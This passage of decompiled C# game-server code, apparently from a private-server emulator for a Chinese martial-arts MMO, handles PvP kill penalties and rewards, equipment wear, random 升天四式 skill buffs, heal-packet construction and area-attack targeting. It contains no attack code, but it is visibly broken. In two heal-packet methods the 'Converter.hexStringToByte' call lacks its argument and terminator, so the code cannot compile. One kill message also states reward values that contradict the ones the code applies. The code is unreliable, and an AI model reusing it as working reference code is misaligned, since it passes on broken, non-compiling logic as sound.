						World.势力战正分数 += (int)((double)Playe.Player_Level * 0.15);
					}
					else if (Buffer.IsEquals(base.势力战派别, "魔族"))
					{
						World.势力战邪分数 += (int)((double)Playe.Player_Level * 0.15);
					}
				}
				return;
			}
			if (Playe.帮派Id != 0)
			{
				Playe.发送消息("[" + Playe.UserName + "]在[" + 坐标Class.getmapname(Playe.人物坐标_地图) + "]被[" + base.UserName + "]所杀！请求支援", 3, "消息");
			}
			if (base.人物善恶 < 0)
			{
				if (Playe.人物善恶 < 0)
				{
					if (Playe.Player_WuXun > 500)
					{
						Playe.人物善恶 += 100;
						Playe.Player_WuXun -= 500;
						Playe.更新武功和状态();
						Playe.系统提示("你当前为红名状态！被玩家[" + base.UserName + "]所杀掉落500点武勋，恢复50点善恶值！", 9, "系统提示");
						base.人物善恶 += 50;
						if (base.Player_Zx == Playe.Player_Zx)
						{
							base.Player_WuXun += 150;
							每日获得武勋 += 150;
							系统提示("杀死一个同势力红名者但你也是红名不过奖励你50点的善恶值150点武勋值", 9, "系统提示");
						}
						else
						{
							base.Player_WuXun += 200;
							每日获得武勋 += 200;
							系统提示("杀死一个不同势力红名者但你也是红名不过奖励你50点的善恶值200点武勋值", 9, "系统提示");
						}
						更新武功和状态();
					}
					else
					{
						Playe.人物善恶 += 50;
						Playe.更新武功和状态();
						Playe.系统提示("你当前为红名状态！被玩家[" + base.UserName + "]所杀，恢复50点善恶值！", 9, "系统提示");
						base.人物善恶 += 100;
						更新武功和状态();
						系统提示("杀死一个红名无武勋者但你也是红名恢复你100点的善恶值", 9, "系统提示");
					}
				}
				else if (Playe.Player_WuXun <= 400)
				{
					if (base.Player_Zx == Playe.Player_Zx)
					{
						base.人物善恶 -= 100;
						系统提示("你杀死了一个没有武勋的同势力玩家,受到惩罚减100点的善恶值", 9, "系统提示");
					}
					else
					{
						系统提示("你杀死了一个没有武勋的不同势力玩家,无任何奖励", 9, "系统提示");
					}
					更新武功和状态();
				}
				else
				{
					Playe.Player_WuXun -= 400;
					Playe.更新武功和状态();
					Playe.系统提示("你被玩家[" + base.UserName + "]所杀掉落400点武勋值！", 9, "系统提示");
					if (base.Player_Zx == Playe.Player_Zx)
					{
						base.人物善恶 -= 100;
						base.Player_WuXun += 200;
						每日获得武勋 += 200;
						系统提示("你杀死了一个有武勋的同势力玩家,增加200点武勋值,受到惩罚减100点的善恶值！", 9, "系统提示");
					}
					else
					{
						base.Player_WuXun += 250;
						每日获得武勋 += 250;
						系统提示("你杀死了一个有武勋的不同势力玩家,增加250点武勋值！", 9, "系统提示");
					}
					更新武功和状态();
				}
			}
			else if (Playe.人物善恶 < 0)
			{
				if (Playe.Player_WuXun <= 500)
				{
					Playe.人物善恶 += 100;
					Playe.更新武功和状态();
					Playe.系统提示("你当前为红名状态！被玩家[" + base.UserName + "]所杀恢复100点善恶值！", 9, "系统提示");
					系统提示("杀死一个红名者,为他(她)消除100点善恶值", 9, "系统提示");
				}
				else
				{
					Playe.人物善恶 += 100;
					Playe.Player_WuXun -= 500;
					Playe.更新武功和状态();
					Playe.系统提示("你当前为红名状态！被玩家[" + base.UserName + "]所杀掉落500点武勋，恢复100点善恶值！", 9, "系统提示");
					if (base.Player_Zx == Playe.Player_Zx)
					{
						base.Player_WuXun += 250;
						每日获得武勋 += 250;
						系统提示("杀死一个同势力红名者奖励你250点武勋值", 9, "系统提示");
					}
					else
					{
						base.Player_WuXun += 300;
						每日获得武勋 += 300;
						系统提示("杀死一个不同势力红名者奖励你300点武勋值", 9, "系统提示");
					}
					更新武功和状态();
				}
			}
			else if (Playe.Player_WuXun <= 400)
			{
				if (base.Player_Zx == Playe.Player_Zx)
				{
					base.人物善恶 -= 100;
					系统提示("你杀死了一个没有武勋的同势力玩家,受到惩罚减100点的善恶值", 9, "系统提示");
				}
				else
				{
					系统提示("你杀死了一个没有武勋的不同势力玩家,无任何奖励", 9, "系统提示");
				}
				更新武功和状态();
			}
			else
			{
				Playe.Player_WuXun -= 400;
				Playe.更新武功和状态();
				Playe.系统提示("被玩家[" + base.UserName + "]所杀掉落400点武勋值！", 9, "系统提示");
				if (base.Player_Zx == Playe.Player_Zx)
				{
					base.人物善恶 -= 100;
					base.Player_WuXun += 200;
					每日获得武勋 += 200;
					系统提示("你杀死了一个有武勋的同势力玩家,增加100点武勋值,受到惩罚减200点的善恶值！", 9, "系统提示");
				}
				else
				{
					base.Player_WuXun += 250;
					每日获得武勋 += 250;
					系统提示("你杀死了一个有武勋的不同势力玩家,增加250点武勋值！", 9, "系统提示");
				}
				更新武功和状态();
			}
			ItmeClass itmeID = ItmeClass.GetItmeID(BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0));
			if (itmeID != null && itmeID.FLD_NJ > 0 && 装备栏已穿装备[3].FLD_FJ_NJ > 0)
			{
				装备栏已穿装备[3].FLD_FJ_NJ -= new Random().Next(1, 5);
				if (装备栏已穿装备[3].FLD_FJ_NJ < 0)
				{
					装备栏已穿装备[3].FLD_FJ_NJ = 0;
				}
				更新装备效果();
				计算人物基本数据3();
			}
			int num = 0;
			while (true)
			{
				if (num < 12)
				{
					ItmeClass itmeID2 = ItmeClass.GetItmeID(BitConverter.ToInt32(Playe.装备栏已穿装备[num].物品ID, 0));
					if (itmeID2 != null && itmeID2.FLD_NJ > 0 && Playe.装备栏已穿装备[num].FLD_FJ_NJ > 0 && (itmeID2.FLD_RESIDE2 == 4 || itmeID2.FLD_RESIDE2 == 1 || itmeID2.FLD_RESIDE2 == 2 || itmeID2.FLD_RESIDE2 == 5 || itmeID2.FLD_RESIDE2 == 6))
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			int num2 = new Random().Next(3, 10);
			Playe.装备栏已穿装备[num].FLD_FJ_NJ -= num2;
			if (Playe.装备栏已穿装备[num].FLD_FJ_NJ < 0)
			{
				Playe.装备栏已穿装备[num].FLD_FJ_NJ = 0;
			}
			Playe.更新装备效果();
			Playe.计算人物基本数据3();
		}

		public bool 判断师徒技能(int 武功ID)
		{
			if (武功ID != 师傅数据.STWG1 && 武功ID != 师傅数据.STWG2)
			{
				return 武功ID == 师傅数据.STWG3;
			}
			return true;
		}

		public void 升天四气功触发(Players Playe)
		{
			try
			{
				if (base.Player_Level >= 140 && base.Player_Job_leve >= 9)
				{
					try
					{
						int num = new Random().Next(1, 101);
						if ((double)num < base.升天四式_悬丝诊脉 && base.Player_Job == 7)
						{
							显示大字(base.人物全服ID, 394);
							if (武功新[1, 13] != null)
							{
								if (组队id != 0)
								{
									组队Class value;
									if (World.W组队.TryGetValue(组队id, out value))
									{
										foreach (Players value12 in value.队员列表.Values)
										{
											if (value12.人物_HP > 0 && !value12.Player死亡 && !value12.Client.挂机 && 查找范围玩家(300, value12))
											{
												if (value12.GetAddState(1008001175))
												{
													value12.追加状态列表[1008001175].时间结束事件();
												}
												if (value12.GetAddState(1008001170))
												{
													value12.追加状态列表[1008001170].时间结束事件();
												}
												追加状态类 value2 = new 追加状态类(value12, 5000, 1008001175, 0);
												value12.追加状态列表.Add(1008001175, value2);
												value12.状态效果(Buffer.GetBytes(1008001175), 1, 5000);
												value12.addFLD_追加百分比_防御(0.1);
												value12.更新武功和状态();
												value12.更新HP_MP_SP();
											}
										}
									}
								}
								else
								{
									if (追加状态列表 != null)
									{
										if (GetAddState(1008001175))
										{
											追加状态列表[1008001175].时间结束事件();
										}
										if (GetAddState(1008001170))
										{
											追加状态列表[1008001170].时间结束事件();
										}
									}
									追加状态列表.Add(1008001175, new 追加状态类(this, 5000, 1008001175, 0));
									状态效果(Buffer.GetBytes(1008001175), 1, 5000);
									addFLD_追加百分比_防御(0.1);
									更新武功和状态();
									更新HP_MP_SP();
								}
							}
						}
						if (!检查毒蛇出洞状态())
						{
							if ((double)num <= base.升天四式_望梅添花 && 武功新[1, 25] != null)
							{
								显示大字(base.人物全服ID, 354);
								if (组队id != 0)
								{
									组队Class value3;
									if (World.W组队.TryGetValue(组队id, out value3))
									{
										foreach (Players value13 in value3.队员列表.Values)
										{
											if (查找范围玩家(500, value13) && (value13.异常状态 == null || !value13.GetAbnormalState(2)))
											{
												if (value13.GetAddState(1008001174))
												{
													value13.追加状态列表[1008001174].时间结束事件();
												}
												if (value13.GetAddState(1008001169))
												{
													value13.追加状态列表[1008001169].时间结束事件();
												}
												追加状态类 value4 = new 追加状态类(value13, 5000, 1008001174, 0);
												value13.追加状态列表.Add(1008001174, value4);
												value13.状态效果(Buffer.GetBytes(1008001174), 1, 5000);
												value13.人物追加最大_HP += 1000;
												value13.更新HP_MP_SP();
											}
										}
									}
								}
								else if (异常状态 != null && !GetAbnormalState(2))
								{
									if (追加状态列表 != null)
									{
										if (GetAddState(1008001174))
										{
											追加状态列表[1008001174].时间结束事件();
										}
										if (GetAddState(1008001169))
										{
											追加状态列表[1008001169].时间结束事件();
										}
									}
									追加状态列表.Add(1008001174, new 追加状态类(this, 5000, 1008001174, 0));
									状态效果(Buffer.GetBytes(1008001174), 1, 5000);
									base.人物追加最大_HP += 1000;
									更新HP_MP_SP();
								}
							}
							if ((double)num < base.升天四式_烈日炎炎)
							{
								显示大字(base.人物全服ID, 344);
								if (!Playe.检查烈日炎炎状态())
								{
									追加状态类 value5 = new 追加状态类(Playe, 5000, 1008001169, 0);
									Playe.追加状态列表.Add(1008001169, value5);
									Playe.状态效果(BitConverter.GetBytes(1008001169), 1, 5000);
									Playe.delFLD_追加百分比_防御(0.15);
									Playe.更新武功和状态();
									Playe.更新人物数据(Playe);
									Playe.更新广播人物数据();
								}
							}
							if ((double)num < base.升天四式_红月狂风)
							{
								try
								{
									显示大字(base.人物全服ID, 313);
									if (PlayList != null)
									{
										foreach (Players value14 in PlayList.Values)
										{
											if (value14.人物_HP > 0 && !value14.Player死亡 && !value14.Client.挂机 && value14.人物全服ID != Playe.人物全服ID && 查找范围玩家(300, value14))
											{
												if (base.人物坐标_地图 == 801)
												{
													if (World.势力战进程 != 2 || base.势力战派别 != value14.势力战派别)
													{
														continue;
													}
												}
												else if (base.人物坐标_地图 == 7301)
												{
													if (World.新门战进程 != 2 || base.帮派名字 != value14.帮派名字)
													{
														continue;
													}
												}
												else if (value14.Player_Zx != base.Player_Zx)
												{
													continue;
												}
												if (!value14.检查红月狂风状态())
												{
													value14.状态效果(Buffer.GetBytes(1008001172), 1, 5000);
													追加状态类 value6 = new 追加状态类(value14, 5000, 1008001172, 0);
													value14.追加状态列表.Add(1008001172, value6);
													if (value14.怒)
													{
														value14.FLD_人物_追加_攻击 += 150;
														value14.FLD_人物_追加_防御 += 150;
														value14.更新武功和状态();
													}
												}
											}
										}
									}
								}
								catch (Exception)
								{
									Form1.WriteLine(1, "升天四气功_红月狂风出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
								}
							}
							if ((double)num < base.升天四式_毒蛇出洞 && !Playe.检查毒蛇出洞状态())
							{
								追加状态类 value7 = new 追加状态类(Playe, 3000, 1008001170, 0);
								Playe.追加状态列表.Add(1008001170, value7);
								Playe.状态效果(BitConverter.GetBytes(1008001170), 1, 3000);
								Playe.更新人物数据(Playe);
								Playe.更新广播人物数据();
								显示大字(base.人物全服ID, 314);
							}
							if ((double)num < base.升天四式_满月狂风)
							{
								try
								{
									if (组队id != 0)
									{
										显示大字(base.人物全服ID, 353);
										组队Class value8;
										if (World.W组队.TryGetValue(组队id, out value8))
										{
											显示大字(base.人物全服ID, 343);
											foreach (Players value15 in value8.队员列表.Values)
											{
												if (value15.人物_HP > 0 && !value15.Player死亡 && !value15.Client.挂机 && 查找范围玩家(300, value15) && !value15.检查满月狂风状态() && !value15.怒)
												{
													value15.怒 = true;
													追加状态类 value9 = new 追加状态类(value15, 5000, 1008001171, 0);
													value15.追加状态列表.Add(1008001171, value9);
													value15.状态效果(Buffer.GetBytes(700014), 1, 5000);
													value15.addFLD_追加百分比_攻击(0.25);
													value15.addFLD_追加百分比_防御(0.25);
													value15.更新人物数据(value15);
													value15.更新广播人物数据();
													value15.更新武功和状态();
												}
											}
										}
									}
								}
								catch
								{
									Form1.WriteLine(1, "升天四气功_满月狂风      出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
								}
							}
							if ((double)num < base.升天四式_哀鸿遍野)
							{
								try
								{
									显示大字(base.人物全服ID, 604);
									if (PlayList != null)
									{
										foreach (Players value16 in PlayList.Values)
										{
											if (value16.人物_HP > 0 && !value16.Player死亡 && !value16.Client.挂机 && 查找范围玩家(300, value16))
											{
												if (base.人物坐标_地图 == 801)
												{
													if (World.势力战进程 != 2 || base.势力战派别 == value16.势力战派别)
													{
														continue;
													}
												}
												else if (base.人物坐标_地图 == 7301)
												{
													if (World.新门战进程 != 2 || base.帮派名字 == value16.帮派名字)
													{
														continue;
													}
												}
												else if (value16.Player_Zx == base.Player_Zx)
												{
													continue;
												}
												if (!value16.检查哀鸿遍野状态())
												{
													value16.FLD_追加哀鸿片野_HP上限 -= 0.15;
													追加状态类 value10 = new 追加状态类(value16, 10000, 1008001176, 0);
													value16.追加状态列表.Add(1008001176, value10);
													value16.状态效果(BitConverter.GetBytes(1008001176), 1, 10000);
													value16.更新人物数据(value16);
													value16.更新广播人物数据();
													value16.更新HP_MP_SP();
												}
											}
										}
									}
								}
								catch (Exception)
								{
									Form1.WriteLine(1, "升天四气功_哀鸿遍野      出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
								}
							}
							if (!((double)num >= base.升天四式_长虹贯天))
							{
								try
								{
									显示大字(base.人物全服ID, 603);
									if (PlayList != null)
									{
										foreach (Players value17 in PlayList.Values)
										{
											if (value17.人物_HP > 0 && !value17.Player死亡 && 查找范围玩家(300, value17))
											{
												if (base.人物坐标_地图 == 801)
												{
													if (World.势力战进程 != 2 || base.势力战派别 != value17.势力战派别)
													{
														continue;
													}
												}
												else if (base.人物坐标_地图 == 7301)
												{
													if (World.新门战进程 != 2 || base.帮派名字 != value17.帮派名字)
													{
														continue;
													}
												}
												else if (value17.Player_Zx != base.Player_Zx)
												{
													continue;
												}
												if (!value17.检查长虹贯天状态())
												{
													追加状态类 value11 = new 追加状态类(value17, 5000, 1008001173, 0);
													value17.追加状态列表.Add(1008001173, value11);
													value17.状态效果(Buffer.GetBytes(1008001173), 1, 5000);
													value17.FLD_人物_追加_攻击 += 100;
													value17.FLD_人物_追加_防御 += 100;
													value17.人物追加最大_HP += 1000;
													value17.人物追加最大_MP += 1000;
													value17.更新HP_MP_SP();
													value17.更新武功和状态();
												}
											}
										}
									}
								}
								catch (Exception)
								{
									Form1.WriteLine(1, "升天四气功_长虹贯天      出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
								}
							}
						}
					}
					catch (Exception ex4)
					{
						Form1.WriteLine(1, "升天四气功计算出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ((ex4 != null) ? ex4.ToString() : null));
					}
				}
			}
			catch (Exception ex5)
			{
				Form1.WriteLine(1, "升天四气功_触发      出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex5.Message);
			}
		}

		public void 发送反伤攻击数据(int 攻击力, int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA551B00A42789000C002C0100000F0000000100000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(人物ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(Buffer.GetBytes(攻击力), 0, array, 18, 2);
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 发送医生群疗数据(int 人物ID, 组队Class 组队, int 增加血量, int 武功ID, 武功类 武功)
		{
			byte[] array = Converter.hexStringToByte
			System.Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(组队.队员列表.Count), 0, array, 14, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(武功.FLD_EFFERT), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 26, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 34, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 30, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			int num = 0;
			foreach (Players value in 组队.队员列表.Values)
			{
				if (!value.Player死亡 && value.人物_HP > 0)
				{
					int num2 = (value.人物最大_HP - value.人物_HP < 增加血量) ? (value.人物最大_HP - value.人物_HP) : 增加血量;
					if (查找范围玩家(1000, value))
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(value.人物全服ID), 0, array, 122 + num * 2, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 162 + num * 2, 2);
						value.人物_HP += num2;
						value.更新HP_MP_SP();
					}
					num++;
				}
			}
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 发送医生群体辅助数据(int 人物ID, 组队Class 组队, int 增加血量, int 武功ID, 武功类 武功)
		{
			byte[] array = Converter.hexStringToByte
			System.Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(组队.队员列表.Count), 0, array, 14, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(武功.FLD_EFFERT), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 26, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 34, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 30, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			int num = 0;
			foreach (Players value in 组队.队员列表.Values)
			{
				if (查找范围玩家(400, value) && value.人物_HP > 0 && !value.Player死亡)
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(value.人物全服ID), 0, array, 122 + num * 2, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 162 + num * 2, 2);
					num++;
				}
			}
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 魔法使用(double mp)
		{
			try
			{
				switch (base.Player_Job)
				{
				default:
					base.人物_MP -= (int)mp;
					break;
				case 13:
				{
					double num2 = base.神女太极心法 * 0.01;
					mp -= mp * num2;
					base.人物_MP -= (int)mp;
					break;
				}
				case 7:
					mp -= (double)(int)(mp * (base.琴师_高山流水 * 0.015));
					base.人物_MP -= (int)mp;
					break;
				case 5:
				{
					double num = base.医_太极心法 * 0.01;
					mp -= mp * num;
					base.人物_MP -= (int)mp;
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "魔法使用" + base.人物全服ID + "|" + ToString() + "   " + ex.Message);
			}
		}

		public List<Players> 群攻查找范围RW2(Players player, int 数量)
		{
			try
			{
				List<Players> list = new List<Players>();
				int num = 0;
				foreach (Players value in player.PlayList.Values)
				{
					if (查找范围玩家(100, value))
					{
						list.Add(value);
						if (num >= 数量)
						{
							break;
						}
						num++;
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "群攻查找范围玩家   出错：" + ((ex != null) ? ex.ToString() : null));
				return null;
			}
		}

		public void 攻击计算完成(Players Play, int 人物ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量, int 障力吸收)
		{
			try
			{
				if (攻击力 <= 0)
				{
					攻击力 = 0;
				}
				攻击确认时间 = 0;
				上次攻击人物ID = 人物ID;
				int 宠物攻击力 = -1;
				武功类 value;
				攻击类 攻击类;
				if (World.TBL_KONGFU.TryGetValue(武功ID, out value))
				{
					if (人物ID >= 10000)
					{
						if (value.FLD_TYPE != 4 && !触发流星漫天 && !触发杀星义气虎 && !触发杀星义气杀)
						{
							if (MapClass.GetNpc(base.人物坐标_地图, 人物ID) != null)
							{
								if (人物灵兽 != null)
								{
									宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 1].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 2].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 3].FLD_AT))));
								}
								攻击类 = new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT);
								发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 最后血量, 障力吸收, 宠物攻击力);
								goto IL_06cd;
							}
						}
						else
						{
							int num = value.FLD_攻击数量;
							if (触发流星漫天)
							{
								num = 5;
							}
							if (触发杀星义气虎)
							{
								num = 5;
							}
							if (触发杀星义气杀)
							{
								num = 1;
							}
							if (Play.Player_Job != 1 && Play.Player_Job != 8)
							{
								if (Play.Player_Job == 7)
								{
									double num2 = 0.0;
									if (Play.GetAddState(900403))
									{
										if (Play.琴师_岳阳三醉 > 0.0)
										{
											num2 = 0.026 + Play.琴师_岳阳三醉 * 0.002;
											num = ((Play.琴师_岳阳三醉 != 1.0) ? (num + (int)(1.1 + (Play.琴师_岳阳三醉 - 1.0) * 0.048)) : (num + 1));
										}
										if (Play.琴师_升天三气功_子夜秋歌 > 0.0)
										{
											num2 = ((!(Play.琴师_升天三气功_子夜秋歌 >= 2.0)) ? (num2 * 1.1) : (num2 * (1.1 + (Play.琴师_升天三气功_子夜秋歌 - 1.0) * 0.0142)));
										}
										if (触发鸾凤和鸣)
										{
											if (num2 > 0.0)
											{
												if (Play.琴师_升天一气功_飞花点翠 > 0.0)
												{
													double num3 = 0.0;
													double num4;
													if (Play.琴师_升天一气功_飞花点翠 <= 3.0)
													{
														num4 = 0.02;
														if (Play.琴师_升天一气功_飞花点翠 == 3.0)
														{
															num4 += 0.021;
														}
													}
													else
													{
														num4 = num3 + (0.02 + Play.琴师_升天一气功_飞花点翠 * 0.0002);
													}
													num2 *= 2.0 + num4;
													num *= (int)(2.0 + num4);
												}
												else
												{
													num2 *= 2.0;
													num *= 2;
												}
											}
											触发鸾凤和鸣 = false;
										}
									}
									攻击力 = (int)((double)攻击力 * (1.0 + num2));
								}
								else if (Play.Player_Job == 13)
								{
									攻击力 = (int)((double)攻击力 * (1.0 + base.神女神力激发));
								}
							}
							else
							{
								攻击力 = (int)((double)攻击力 * (1.0 + base.流光乱舞));
							}
							攻击类 = ((Play.Player_Job == 13 && 触发杀星义气虎) ? new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气虎) : ((Play.Player_Job != 13 || !触发杀星义气杀) ? new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发流星漫天) : new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气杀)));
							NpcClass npc = MapClass.GetNpc(base.人物坐标_地图, 人物ID);
							if (npc != null)
							{
								攻击类.群攻.Add(new 群攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT)
								{
									剩余血量 = npc.Rxjh_HP,
									总血量 = npc.Max_Rxjh_HP
								});
								List<NpcClass> list = npc.群攻查找范围Npc2(this, num);
								int num5 = 攻击力 - 攻击力 / 3;
								Random random = new Random();
								if (list != null && list.Count > 0)
								{
									foreach (NpcClass item in list)
									{
										num5 = random.Next(num5 - 15, num5 + 15);
										攻击类.群攻.Add(new 群攻击类(item.FLD_INDEX, 武功ID, num5, value.FLD_EFFERT)
										{
											剩余血量 = item.Rxjh_HP,
											总血量 = item.Max_Rxjh_HP
										});
										if (攻击类.群攻.Count >= num)
										{
											break;
										}
									}
								}
								if (人物灵兽 != null)
								{
									宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 1].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 2].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 3].FLD_AT))));
								}
								if (Play.Player_Job == 12)
								{
									发送卢群攻攻击数据(Play, 攻击类.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
								}
								else if (Play.Player_Job == 13 && 触发杀星义气虎)
								{
									发送神女群攻攻击数据(Play, 攻击类.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
								}
								else if (Play.Player_Job == 13 && 触发杀星义气杀)
								{
									发送神女群攻攻击数据2(Play, 攻击类.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
								}
								else
								{
									发送群攻攻击数据2(Play, 攻击类.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
								}
								goto IL_06cd;
							}
						}
					}
					else
					{
						if (!触发流星漫天 && !触发杀星义气虎 && !触发杀星义气杀)
						{
							if (人物灵兽 != null)
							{
								宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 1].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 2].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 3].FLD_AT))));
							}
							发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 最后血量, 障力吸收, 宠物攻击力);
						}
						else
						{
							int num6 = value.FLD_攻击数量;
							if (触发流星漫天)
							{
								num6 = 1;
							}
							if (触发杀星义气虎)
							{
								num6 = 1;
							}
							if (触发杀星义气杀)
							{
								num6 = 1;
							}
							if (人物灵兽 != null)
							{
								宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 1].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 2].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 3].FLD_AT))));
							}
							攻击类 攻击类2 = (Play.Player_Job == 13 && 触发杀星义气虎) ? new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气虎) : ((Play.Player_Job != 13 || !触发杀星义气杀) ? new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发流星漫天) : new 攻击类(Play.人物全服ID, 武功ID, 攻击力, value.FLD_EFFERT, value.FLD_TYPE, 触发杀星义气杀));
							List<Players> list2 = 群攻查找范围RW2(this, num6);
							int num7 = 攻击力;
							Random random2 = new Random();
							if (list2 != null && list2.Count > 0)
							{
								foreach (Players item2 in list2)
								{
									num7 = random2.Next(num7 - 15, num7 + 15);
									攻击类2.群攻.Add(new 群攻击类(item2.人物全服ID, 武功ID, num7, value.FLD_EFFERT)
									{
										剩余血量 = item2.人物_HP,
										总血量 = item2.人物最大_HP
									});
									if (攻击类2.群攻.Count >= num6)
									{
										break;
									}
								}
							}
							if (Play.Player_Job == 12)
							{
								发送卢群攻攻击数据2(Play, 攻击类2.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
							}
							else if (Play.Player_Job == 13 && 触发杀星义气虎)
							{
								发送神女群攻攻击数据(Play, 攻击类2.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
							}
							else if (Play.Player_Job == 13 && 触发杀星义气杀)
							{
								发送神女群攻攻击数据2(Play, 攻击类2.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
							}
							else
							{
								发送群攻攻击数据2(Play, 攻击类2.群攻, 人物ID, 武功ID, 攻击力, value.FLD_EFFERT, 宠物攻击力);
							}
						}
						攻击列表.Clear();
						攻击确认次数 = 1;
						using (new Lock(攻击列表, "攻击列表"))
						{
							攻击列表.Add(new 攻击类(人物ID, 武功ID, 攻击力, value.FLD_EFFERT));
						}
						SendPack(Play.人物全服ID, 人物ID, 0, value.FLD_PID, 500);
					}
				}
				else
				{
					if (人物灵兽 != null)
					{
